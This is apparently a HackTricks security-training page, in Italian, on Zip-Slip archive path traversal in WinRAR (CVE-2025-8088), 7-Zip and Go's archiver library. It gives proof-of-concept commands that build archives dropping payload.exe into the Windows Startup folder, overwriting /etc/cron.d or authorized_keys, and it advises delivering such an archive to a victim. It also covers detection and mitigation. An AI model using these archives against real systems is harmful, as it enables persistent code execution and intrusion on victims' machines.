# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Panoramica

Molti formati di archivio (ZIP, RAR, TAR, 7-ZIP, ecc.) consentono a ogni entry di contenere il proprio **percorso interno**. Quando un'utility di estrazione rispetta ciecamente tale percorso, un filename creato ad arte contenente `..` o un **percorso assoluto** (ad es. `C:\Windows\System32\`) verrà scritto al di fuori della directory scelta dall'utente.
Questa classe di vulnerabilità è ampiamente conosciuta come *Zip-Slip* o **archive extraction path traversal**.

Le conseguenze vanno dalla sovrascrittura di file arbitrari fino all'ottenimento diretto della **remote code execution (RCE)** tramite il posizionamento di un payload in una posizione **auto-run**, come la cartella *Startup* di Windows.

## Causa principale

1. L'attacker crea un archivio in cui uno o più file header contengono:
* Sequenze di traversal relative (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Percorsi assoluti (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Oppure **symlink** creati ad arte che puntano al di fuori della directory target (comune negli ZIP/TAR su *nix*).
2. La vittima estrae l'archivio con uno strumento vulnerabile che si fida del percorso incorporato (o segue i symlink) invece di sanificarlo o forzare l'estrazione all'interno della directory scelta.
3. Il file viene scritto nella posizione controllata dall'attacker ed eseguito/caricato la volta successiva in cui il sistema o l'utente attiva quel percorso.

### Traversal di `.NET` `Path.Combine` + `ZipArchive`

Un anti-pattern comune in .NET consiste nel combinare la destinazione prevista con `ZipArchiveEntry.FullName`, controllato dall'utente, ed eseguire l'estrazione senza la normalizzazione del percorso:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` inizia con `..\\`, esegue un traversal; se è un **percorso assoluto**, il componente a sinistra viene scartato completamente, producendo una **scrittura arbitraria di file** come identità dell'estrazione.
- Archivio proof-of-concept per scrivere in una directory `app` adiacente monitorata da uno scanner pianificato:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Inserire quel file ZIP nella inbox monitorata produce `C:\samples\app\0xdf.txt`, dimostrando il traversal al di fuori di `C:\samples\queue\` e consentendo primitive successive (ad esempio, DLL hijacks).

## Esempio reale – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR per Windows (inclusi la CLI `rar` / `unrar`, la DLL e il codice sorgente portable) non convalidava i nomi dei file durante l'estrazione.
Un archivio RAR malevolo contenente una voce come:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
finirebbe **al di fuori** della directory di output selezionata e all’interno della cartella *Startup* dell’utente. Dopo il logon, Windows esegue automaticamente tutto ciò che è presente al suo interno, fornendo RCE *persistent*.<sup>[[5]](#references)</sup>

### Creazione di un archivio PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opzioni utilizzate:
* `-ep`  – memorizza i percorsi dei file esattamente come forniti (non rimuove i `./` iniziali).

Consegna `evil.rar` alla vittima e istruiscila a estrarlo con una build vulnerabile di WinRAR.

### Sfruttamento osservato in natura

ESET ha segnalato campagne di spear-phishing di RomCom (Storm-0978/UNC2596) che allegavano archivi RAR sfruttando CVE-2025-8088 per distribuire backdoor personalizzate e facilitare operazioni di ransomware.<sup>[[5]](#references)</sup>

## Casi più recenti (2024–2025)

### Traversal di symlink ZIP in 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: le entry ZIP che erano **symbolic links** venivano dereferenziate durante l'estrazione, consentendo agli aggressori di evadere dalla directory di destinazione e sovrascrivere percorsi arbitrari. L'interazione dell'utente consiste semplicemente nell'*aprire/estrarre* l'archivio.<sup>[[1]](#references)</sup>
* **Vulnerabili**: 7-Zip 21.02–24.09 (build per Windows e Linux). Risolto nella versione **25.00** (luglio 2025) e successive.
* **Percorso d'impatto**: sovrascrivere `Start Menu/Programs/Startup` o posizioni eseguite dai servizi → il codice viene eseguito al login successivo o al riavvio del servizio.
* **PoC rapido (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Su una build corretta `/etc/cron.d` non verrà modificato; il symlink verrà estratto come link all'interno di `/tmp/target`.

### Zip-Slip di Go mholt/archiver Unarchive() (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` segue `../` e le entry ZIP collegate tramite symlink, scrivendo al di fuori di `outputDir`.<sup>[[2]](#references)</sup>
* **Vulnerabile**: `github.com/mholt/archiver` ≤ 3.5.1 (il progetto è ora deprecato).
* **Risoluzione**: passa a `mholt/archives` ≥ 0.1.0 oppure implementa controlli sui percorsi canonici prima della scrittura.
* **Riproduzione minima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Suggerimenti per il rilevamento

* **Ispezione statica** – elenca le entry dell'archivio e segnala qualsiasi nome contenente `../`, `..\\`, *percorsi assoluti* (`/`, `C:`) o entry di tipo *symlink* il cui target si trova al di fuori della directory di estrazione.
* **Canonicalizzazione** – assicurati che `realpath(join(dest, name))` inizi ancora con `dest`. In caso contrario, rifiutalo.<sup>[[3]](#references)</sup>
* **Estrazione in sandbox** – decomprimi in una directory usa e getta utilizzando un extractor *sicuro* (ad es. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verifica che i percorsi risultanti rimangano all'interno della directory.
* **Monitoraggio degli endpoint** – genera un alert per i nuovi eseguibili scritti nelle posizioni `Startup`/`Run`/`cron` poco dopo l'apertura di un archivio tramite WinRAR/7-Zip/ecc.

## Mitigazione e hardening

1. **Aggiorna l'extractor** – WinRAR 7.13+ e 7-Zip 25.00+ implementano la sanitizzazione dei percorsi/symlink. Entrambi gli strumenti non dispongono comunque di auto-update.
2. Quando possibile, estrai gli archivi con “**Non estrarre i percorsi**” / “**Ignora i percorsi**”.
3. Su Unix, riduci i privilegi e monta un **chroot/namespace** prima dell'estrazione; su Windows, usa **AppContainer** o una sandbox.
4. Se scrivi codice personalizzato, normalizza con `realpath()`/`PathCanonicalize()` **prima** di creare/scrivere e rifiuta qualsiasi entry che esca dalla destinazione.

## Altri casi vulnerabili / storici

* 2018 – Advisory *Zip-Slip* di massa di Snyk che interessava molte librerie Java/Go/JS.
* 2023 – CVE-2023-4011 di 7-Zip, traversal simile durante il merge `-ao`.
* 2025 – `go-slug` di HashiCorp (CVE-2025-0377), traversal durante l'estrazione TAR negli slug (patch nella v1.2).
* Qualsiasi logica di estrazione personalizzata che non chiami `PathCanonicalize` / `realpath` prima della scrittura.

## Riferimenti

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
